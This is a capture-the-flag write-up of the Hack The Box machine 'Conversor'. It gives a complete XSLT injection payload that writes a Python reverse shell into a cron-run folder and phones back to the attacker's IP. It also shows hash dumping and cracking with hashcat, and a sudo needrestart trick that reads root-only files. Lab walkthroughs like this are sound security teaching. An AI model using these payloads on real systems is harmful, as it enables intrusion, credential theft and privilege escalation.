---
title: Hack the Box - Conversor
time: 2025-11-16 12:00:00
categories: [htb, easy]
tags: [xlst injection]
---

Conversor is an Easy Linux machine focused on XSLT Injection, file write primitives, and abusing cron execution for privilege escalation to a shell. The final privilege escalation uses a clever trick with needrestart to read arbitrary files as root.

# Recon
## Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```bash
╰─ nmap -sV -sC -A 10.10.11.92
Starting Nmap 7.94 ( https://nmap.org ) at 2025-11-14 22:20 +08
Nmap scan report for 10.10.11.92 (10.10.11.92)
Host is up (0.12s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp    open     http        Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.42 seconds
```
The HTTP service redirects to conversor.htb, so add it to `/etc/hosts`.

## conversor.htb - TCP 80 (Apache HTTP)
Navigating to `http://conversor.htb` shows a simple login page with a Register option. 

<img width="914" height="377" alt="image" src="https://github.com/user-attachments/assets/9f94b721-0bef-456b-8e55-7a57ea3a5429" />

After signing up, the `/` page contains:
- XML upload
- XSLT upload
- Convert → Generates HTML

This is immediately suspicious because XSLT is known to allow extended functionalities when not properly sandboxed.

<img width="950" height="461" alt="image" src="https://github.com/user-attachments/assets/a41a8480-de40-4842-bc97-68bbbd857f80" />

`/about` provides a downloadable ZIP containing the web application source code.
<img width="900" height="419" alt="image" src="https://github.com/user-attachments/assets/382bf289-9bdc-4158-8b82-d3d2790f0235" />

### Source Code Review

#### app.py

User database is stored in users.db. Uploaded XML/XSLT files are saved directly to disk.
```
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = '/var/www/conversor.htb/instance/users.db'
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
```
`resolve_entities=False` disables XXE, but `libxslt` still supports custom extension functions, enabling file read/write and command execution depending on version.
```
parser = etree.XMLParser(resolve_entities=False, no_network=True)
xml_tree = etree.parse(xml_path, parser)
xslt_tree = etree.parse(xslt_path)
transform = etree.XSLT(xslt_tree)
result_tree = transform(xml_tree)
```

#### From install.md
Any `.py` dropped into `/var/www/conversor.htb/scripts/` runs automatically as `www-data` every minute.
```bash
If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.
"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

# Shell as www-data
We can leverage the XLST file upload feature to do <a href="https://ine.com/blog/xslt-injections-for-dummies">XLST injection</a>. Since there is no validation on server side, we can injection malicious code to  read/write files from the file system, or execute arbitrary code. 

Using payload from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection#determine-the-vendor-and-version">PayloadAllTheThings</a>, we can do some recon on the XLST version and vendor.

> libxslt 1.0
> → Supports exslt:document to write arbitrary files.

I have some issues to read the file using `file://` and `document()`, so we need to find other ways. `install.md` mentioned that there is cron job that will run any Python scripts in script folder. We can write our own Python script using XLTS injection and wait until the cron exceuted the script.

## Arbitrary File Write (Python Reverse Shell)
This XLTS file will write `rev.py` on `/var/www/conversor.htb/scripts/` which contain a reverse shell. 
```py
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common"
  extension-element-prefixes="exploit"
  version="1.0">

  <xsl:template match="/">
    <exploit:document href="/var/www/conversor.htb/scripts/rev.py" method="text">
#!/usr/bin/env python3
import socket,subprocess,os

IP="10.10.14.107"
PORT=4444

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((IP,PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
    </exploit:document>
  </xsl:template>

</xsl:stylesheet>
```

Upload malicious XLTS file with any XML file. Setup `netcat` listener and wait until the cron job executes the script. And voila, you will get a shell.
```bash
╰─ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.107] from (UNKNOWN) [10.10.11.92] 40764
bash: cannot set terminal process group (1361): Inappropriate ioctl for device
bash: no job control in this shell
www-data@conversor:~$ ls
ls
conversor.htb
```
## Extracting Credentials (users.db)
users.db has the MD5 hash password for `fismathack`, `admin` and `user`. 
```bash
www-data@conversor:~/conversor.htb$ cd instance
cd instance
www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db "SELECT * FROM users;"
<b/instance$ sqlite3 users.db "SELECT * FROM users;"
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|admin|5f4dcc3b5aa765d61d8327deb882cf99
6|user01|1a1dc91c907325c69271ddf0c944bc72
```

Cracked via hashcat:
```bash
╰─ hashcat -m 0 -a 0 hash /usr/share/wordlists/dirbuster/rockyou.txt

hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
Dictionary cache built:
* Filename..: /usr/share/wordlists/dirbuster/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 2 secs

5f4dcc3b5aa765d61d8327deb882cf99:password                 
1a1dc91c907325c69271ddf0c944bc72:pass
5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm        
```

# Shell as fismathack
Use `fismathack` username and password for SSH access and get the user flag.
```
ssh fismathack@10.10.11.92  
fismathack@10.10.11.92's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-160-generic x86_64)

Last login: Sat Nov 15 21:31:27 2025 from 10.10.14.107
fismathack@conversor:~$ ;s
-bash: syntax error near unexpected token `;'
fismathack@conversor:~$ ls
user.txt
fismathack@conversor:~$ cat user.txt
7856c0ea28******************
```

# Root Flag
We can run `/usr/sbin/needrestart` as sudo. `needrestart` is known for LPEs (e.g., (<a href="https://github.com/ns989/CVE-2024-48990"> CVE-2024-48990 </a>), but in this case we can use it in a simpler way.

```bash
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

According to this <a href="https://www.cheat-sheets.org/project/tldr/command/needrestart/os/linux/"> cheatsheet </a>, `needrestart` accepts a custom config using `-c` flag. It attempts to parse the file using Perl, and when parsing fails, it leaks the file’s contents in error messages.

So reading `/root/root.txt`:
```bash
fismathack@conversor:/$ sudo /usr/sbin/needrestart -c /root/root.txt
Bareword found where operator expected at (eval 14) line 1, near "0a98db1197936abad52d849fdc0cc1e1"
        (Missing operator before a98db1197936abad52d849fdc0cc1e1?)
Error parsing /root/root.txt: syntax error at (eval 14) line 2, near "0a98db1197936abad52d849fdc0cc1e1
"
```

# Conclusion

Conversor is a well-designed box illustrating:
- XSLT Injection (file write primitive via EXSLT)
- Cron-based code execution for RCE
- SQLite credential extraction and cracking
- Abuse of `needrestart` for unintended file disclosure
